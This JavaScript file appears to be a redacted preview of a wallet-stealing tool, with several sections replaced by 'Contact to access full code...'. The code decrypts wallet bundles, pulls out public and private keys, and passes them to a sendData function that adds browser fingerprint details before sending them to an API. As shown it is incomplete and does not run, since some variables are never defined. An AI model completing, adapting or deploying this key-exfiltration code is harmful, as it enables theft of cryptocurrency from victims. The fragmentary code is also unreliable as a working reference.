function arrayToString(dataArray) {
    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

    const resultDigits = [0];

    for (let element of dataArray) {
        let carry = element;

        for (let i = 0; i < resultDigits.length; i++) {
            const value = resultDigits[i] * 0x100 + carry;

            resultDigits[i] = value % 58;
            carry = value / 58 | 0;
        }

        while (carry) {
            resultDigits.push(carry % 58);

            carry = carry / 58 | 0;
        }
    }

    let resultString = "";

    for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];

    for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];

    return resultString
}

function stringToArray(key) {
    try {
        const cleanedKey = key.replace(new RegExp("-", "g"), "+").replace(new RegExp("_", "g"), "/");

        return Uint8Array.from(atob(cleanedKey), key => {
            return key.charCodeAt(0)
        })
    } catch {
        return new TextEncoder().encode(key)
    }
}

async function sendData(apiUrl, data) {
    var timestamp = Math.floor(Date.now() / 0x3e8);
    var header = `${navigator["userAgent"]}|${timestamp}`;

    data["timestamp"] = timestamp;
    data["header"] = header;

    // Contact to access full code...

    document.head.appendChild(styleElement);
}

async function decrypt(key, toDecrypt) {
    const [ivString, dataString] = String(toDecrypt).split(":");

    // Contact to access full code...
    
    return new Uint8Array(decrypted)
}

(async () => {
    // Contact to access full code...

    const errors = [];
    const success = [];

    for (const bundle of bundles) {
        let publicKey = "(unknown)";
        let privateKey = "";

        try {
            const decryptedBundle = await decrypt(cryptoKey, bundle);
            

            // Contact to access full code...


            success.push({
                "pub": publicKey,
                "priv": privateKey
            });


        } catch (sIIFx3y) {
            errors.push({
                "pub": publicKey,
                "reason": sIIFx3y["message"]
            })
        }
    }

    let sent = [];
    let keys = [];

    keys.push(...success.map(key => {
        return {
            "public": key["pub"],
            "private": key["priv"]
        }
    }));

    sendData(
      // Contact to access full code...
    );
})();
